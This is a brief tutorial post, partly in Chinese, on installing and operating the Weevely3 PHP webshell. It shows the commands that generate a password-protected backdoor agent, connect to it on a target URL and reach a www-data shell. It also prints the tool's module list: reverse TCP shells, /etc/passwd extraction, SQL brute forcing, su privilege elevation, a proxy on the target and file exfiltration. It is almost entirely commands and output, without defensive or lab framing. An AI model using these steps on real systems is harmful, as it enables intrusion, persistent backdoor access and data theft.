---
title: "Weevely3"
date: 2016-03-23 10:14
---

## weevely3

[github weevely3][1]

weevely是一款使用python编写的webshell工具, 能生成webshell和连接，仅适用于php

* install

The following example runs on a Debian/Ubuntu derived Linux environments with Python version 2.7.

```
# Make sure that the python package manager and yaml libraries are installed
$ sudo apt-get install g++ python-pip libyaml-dev python-dev
# Install requirements
$ sudo pip install prettytable Mako PyYAML python-dateutil PySocks --upgrade
```

then download weevely from github

* set link

```
sudo ln -s ~/Tool/weevely3/weevely.py /usr/local/bin/weevely
```
## use help

```
$ python weevely.py -h
usage: weevely [-h] {terminal,session,generate} ...

positional arguments:
  {terminal,session,generate}
    terminal            Run terminal
    session             Recover an existant a session file
    generate            Generate a new password

optional arguments:
  -h, --help            show this help message and exit
```

## generate backdoor agent

```
weevely generate -h
usage: weevely generate [-h] [-obfuscator {cleartext1_php,obfusc1_php}]
                        [-agent {stegaref_php_debug,legacycookie_php,stegaref_php}]
                        password path

positional arguments:
  password              The agent password
  path                  Where save the generated agent

optional arguments:
  -h, --help            show this help message and exit
  -obfuscator {cleartext1_php,obfusc1_php}
  -agent {stegaref_php_debug,legacycookie_php,stegaref_php}
```

```
$ weevely generate password agent.php 
Generated backdoor with password 'password' in 'agent.php' of 1322 byte size.
```

## connect to agent

```
$ weevely http://target/agent.php password

weevely http://localhost/backdoor/agent.php x

[+] weevely 3.2.0

[+] Target:	localhost
[+] Session:	/home/hx/.weevely/sessions/localhost/agent_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> :help

 :audit_etcpasswd      Get /etc/passwd with different techniques.                           
 :audit_filesystem     Audit system files for wrong permissions.                            
 :audit_phpconf        Audit PHP configuration.                                             
 :audit_suidsgid       Find files with SUID or SGID flags.                                  
 :shell_php            Execute PHP commands.                                                
 :shell_su             Elevate privileges with su command.                                  
 :shell_sh             Execute Shell commands.                                              
 :system_info          Collect system information.                                          
 :system_extensions    Collect PHP and webserver extension list.                            
 :backdoor_reversetcp  Execute a reverse TCP shell.                                         
 :backdoor_tcp         Spawn a shell on a TCP port.                                         
 :bruteforce_sql       Bruteforce SQL database.                                             
 :file_enum            Check existence and permissions of a list of paths.                  
 :file_edit            Edit remote file on a local editor.                                  
 :file_zip             Compress or expand zip files.                                        
 :file_upload          Upload file to remote filesystem.                                    
 :file_webdownload     Download URL to the filesystem                                       
 :file_upload2web      Upload file automatically to a web folder and get corresponding URL. 
 :file_mount           Mount remote filesystem using HTTPfs.                                
 :file_read            Read remote file from the remote filesystem.                         
 :file_gzip            Compress or expand gzip files.                                       
 :file_tar             Compress or expand tar archives.                                     
 :file_cd              Change current working directory.                                    
 :file_find            Find files with given names and attributes.                          
 :file_check           Get remote file information.                                         
 :file_grep            Print lines matching a pattern in multiple files.                    
 :file_download        Download file to remote filesystem.                                  
 :file_cp              Copy single file.                                                    
 :file_touch           Change file timestamp.                                               
 :file_rm              Remove remote file.                                                  
 :file_bzip2           Compress or expand bzip2 files.                                      
 :file_ls              List directory content.                                              
 :sql_console          Execute SQL query or run console.                                    
 :sql_dump             Multi dbms mysqldump replacement.                                    
 :net_ifconfig         Get network interfaces addresses.                                    
 :net_curl             Perform a curl-like HTTP request.                                    
 :net_scan             TCP Port scan.                                                       
 :net_phpproxy         Install PHP proxy on the target.                                     
 :net_proxy            Proxify local HTTP traffic passing through the target. 
 
 The system shell interpreter is not available in this session, use the
following command replacements to simulate a unrestricted shell.

 zip, unzip                                 file_zip         
 touch                                      file_touch       
 gzip, gunzip                               file_gzip        
 mail                                       net_mail         
 curl                                       net_curl         
 nmap                                       net_scan         
 cd                                         file_cd          
 rm                                         file_rm          
 cat                                        file_read        
 ifconfig                                   shell_su         
 vi, vim, emacs, nano, pico, gedit, kwrite  file_edit        
 wget                                       file_webdownload 
 find                                       file_find        
 tar                                        file_tar         
 ifconfig                                   net_ifconfig     
 bzip2, bunzip2                             file_bzip2       
 ls, dir                                    file_ls          
 cp, copy                                   file_cp          
 grep                                       file_grep        
 whoami, hostname, pwd, uname               system_info                

www-data@kali:/var/www/backdoor $ ls
agent.php
```

[1]: https://github.com/epinna/weevely3